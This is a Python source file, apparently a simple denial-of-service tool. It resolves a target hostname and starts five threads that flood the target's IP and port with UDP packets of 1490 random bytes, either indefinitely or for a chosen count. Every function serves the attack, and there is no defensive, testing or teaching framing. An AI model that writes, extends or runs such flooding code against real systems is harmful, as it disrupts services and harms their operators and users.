import socket
import random
import threading
from colorama import Fore

def execute_attack(target, bytes, quantidade):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent_packages = 0

    try:
        if quantidade == 0:
            print(Fore.YELLOW + "attacking indefinitely... press Ctrl+C to stop")
            while True:
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"package sent... total: {sent_packages}")
        else:
            for _ in range(quantidade):
                sock.sendto(bytes, target)
                sent_packages += 1
                print(Fore.GREEN + f"package sent... total: {sent_packages}")
    except KeyboardInterrupt:
        print(Fore.CYAN + "attack interrupted by user")
    except Exception as e:
        print(Fore.RED + f"error during attack: {e}")
    finally:
        sock.close()

def main_ddos(hostname, door, quantidade):
    if not hostname or not door:
        print(Fore.RED + "invalid entry closing...")
        return

    try:
        ip = socket.gethostbyname(hostname)
        target = (ip, door)
        print(Fore.YELLOW + f"Initiating attack on target {target[0]}:{target[1]}")
        bytes = random._urandom(1490)

        threads = []
        num_threads = 5

        for _ in range(num_threads):
            thread = threading.Thread(target=execute_attack, args=(target, bytes, quantidade))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print(Fore.CYAN + "attack completed")
    except socket.gaierror:
        print(Fore.RED + "Invalid hostname could not resolve IP")
    except Exception as e:
        print(Fore.RED + f"a general error has occurred: {e}")